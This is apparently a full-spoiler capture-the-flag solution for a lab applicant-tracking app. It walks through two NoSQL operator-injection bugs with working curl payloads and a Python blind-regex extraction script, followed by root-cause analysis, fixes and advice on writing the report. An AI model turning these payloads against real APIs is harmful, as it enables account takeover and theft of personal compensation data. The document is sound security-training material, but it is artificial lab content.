# Solution — Blackthorn ATS

Full spoilers.

## First: confirm what is already fixed

The login endpoint is the obvious target, so rule it out:

```bash
curl -s -X POST http://localhost:8090/api/session \
  -H 'Content-Type: application/json' \
  -d '{"email":{"$ne":null},"password":{"$ne":null}}'
# {"error":"invalid credentials"}
```

Read why:

```js
const email = String((req.body && req.body.email) || "");
const password = String((req.body && req.body.password) || "");
```

`String({})` is `"[object Object]"`, which matches nothing. The coercion
is the fix, and it was applied here and nowhere else — which is the
normal outcome of a pentest that reported one endpoint.

## Objective 1 — `HxBugLabs{4n_0p3r4t0r_1s_n0t_4_str1ng}`

### The bug

`POST /api/password-reset/verify` builds the same kind of filter, without
the coercion:

```js
const recruiter = Recruiters.findOne({
  email: String(email).toLowerCase(),    // coerced
  resetToken: token,                     // whatever the client sent
});
```

`email` is a string. `token` is passed through. In a document query, an
object value is not a value — it is a **condition**. Send one and you stop
asking "does the token equal this string" and start asking whatever you
like.

### Exploiting it

You need a target. `p.raghunathan@blackthorn.example` is the head of
talent; the request endpoint is careful not to confirm that the address
exists, but the login endpoint's error messages and any public "team"
page will. Then:

```bash
curl -s -c jar -X POST http://localhost:8090/api/password-reset/verify \
  -H 'Content-Type: application/json' \
  -d '{"email":"p.raghunathan@blackthorn.example",
       "token":{"$ne":null},
       "newPassword":"attacker-owns-this-1"}'
```

```json
{
  "ok": true,
  "signedInAs": {"id":"REC-001","email":"p.raghunathan@blackthorn.example","role":"head-of-talent"},
  "adminNote": "HxBugLabs{4n_0p3r4t0r_1s_n0t_4_str1ng}"
}
```

`{"$ne": null}` reads as "the reset token is not null", which is true for
any account with a token outstanding. `{"$exists": true}`, `{"$gt": ""}`
and `{"$regex": ""}` all work as well. The endpoint sets the session *and*
accepts your new password, so this is a full takeover, not just a read.

### Root cause

**Type confusion at the query boundary.** The endpoint expects a string
and the transport allows an object. Coercion on one endpoint is not a
fix; it is a fix for one endpoint.

What actually fixes it, in order:

1. **Validate types at the edge.** A schema (zod, joi, JSON Schema) that
   declares `token: string` rejects the object before any query is built.
   This is the only fix that scales, because it applies to every field on
   every route.
2. **Never let a client value become a query operator.** If a value must
   reach a filter, wrap it explicitly: `{ resetToken: { $eq: token } }`
   — an object in `token` then compares as a value, not as a condition.
3. **Compare reset tokens in constant time against a hash**, and delete
   them on use. A token that is still valid from January is its own
   finding.

The general test to run on any JSON API: for every field that reaches a
query, send `{"$ne": null}`, `{"$gt": ""}` and `{"$exists": true}`.
Different behaviour on any of them means the value is being evaluated
rather than compared.

## Objective 2 — `HxBugLabs{bl1nd_r3g3x_1s_st1ll_4_r34d_pr1m1t1v3}`

### The bug

Candidate search takes the whole filter from the body:

```js
const filter = req.body.filter;
results = Candidates.find(filter);
res.json({ count: results.length, results: results.map(project) });
```

and `project()` returns only six fields. Compensation, scorecards and
reference codes are filterable and never returned — the documented design,
and the source of the bug: **you can filter on fields you cannot read.**

A response whose `count` changes with your filter is a boolean oracle.

Confirm it against a field that is not in the projection:

```bash
curl -s -b jar -X POST http://localhost:8090/api/candidates/search \
  -H 'Content-Type: application/json' \
  -d '{"filter":{"scorecard":"strong-hire"}}'
# {"count":2, ...}
```

Two candidates rated `strong-hire`, and the rating is nowhere in the
response. You are already reading a hidden field one bit at a time.

### Turning it into a full read

`$regex` turns one bit per request into one *character* per few requests.
Anchor at the start and extend:

```python
import json, urllib.request, http.cookiejar, string

BASE = "http://localhost:8090"
jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

def post(path, payload):
    req = urllib.request.Request(BASE + path, data=json.dumps(payload).encode(),
                                 headers={"Content-Type": "application/json"}, method="POST")
    return json.loads(opener.open(req).read())

post("/api/session", {"email": "t.vidal@blackthorn.example",
                      "password": "Blackthorn-ATS-2026"})

alphabet = string.ascii_letters + string.digits + "{}_"
known = ""
while True:
    for ch in alphabet:
        candidate = known + ch
        probe = "^" + "".join("\\" + c if c in "{}" else c for c in candidate)
        r = post("/api/candidates/search",
                 {"filter": {"id": "CAN-4401", "referenceCode": {"$regex": probe}}})
        if r["count"]:
            known = candidate
            break
    else:
        break
print(known)
```

```
HxBugLabs{bl1nd_r3g3x_1s_st1ll_4_r34d_pr1m1t1v3}
```

Pinning `id` to one candidate keeps the oracle unambiguous — without it a
match could come from any document. Around 65 characters at ~30 requests
each is a couple of thousand requests, seconds of work, and the same
technique reads `compensation.expected` (use `$gt` and binary-search the
number instead of `$regex`).

### Root cause

**Filterable is readable.** Projection controls what the response
*contains*; it does nothing about what the query can *test*. Any field an
attacker can put a condition on is a field they can extract, given a
response that varies — a count, a status code, a length, or a timing
difference.

Fixes:

- **Allow-list filterable fields**, not just returned ones. If
  `referenceCode` and `scorecard` are not meant to be queried by clients,
  reject filters mentioning them.
- **Reject operators from client input** unless a field explicitly opts
  in, and never accept `$regex` from a client — it is also a ReDoS vector.
- Build the query server-side from named parameters
  (`?stage=onsite&location=Rotterdam`), rather than accepting a filter
  object. "The console builds filters client-side" is the design flaw.
- Rate-limit search. Two thousand requests from one session in ten
  seconds should be visible to someone.

## Notes for the report

Two submissions. Do not merge them — different endpoints, different root
causes, and a triager who sees "NoSQL injection" twice in one report will
fix the first one.

- **Objective 1 — account takeover via operator injection in password
  reset.** Critical. One request takes over the head of talent's account
  and sets a password you choose. Note explicitly in the report that the
  login endpoint *is* protected, and that you verified it — it shows the
  team where their coercion fix stopped, and it pre-empts "we already
  fixed that".
- **Objective 2 — blind extraction of non-projected fields via
  client-supplied filters.** High. Compensation figures and internal
  scorecards for every candidate in the ATS are readable by any recruiter
  seat, and candidate compensation is personal data — say so, because it
  moves this from "information disclosure" to something with a regulatory
  dimension.

For the second one, include your request count and the exact field you
recovered. "Filterable fields are extractable" is a claim; "here is
CAN-4401's reference code, recovered in 2,100 requests" is a finding.
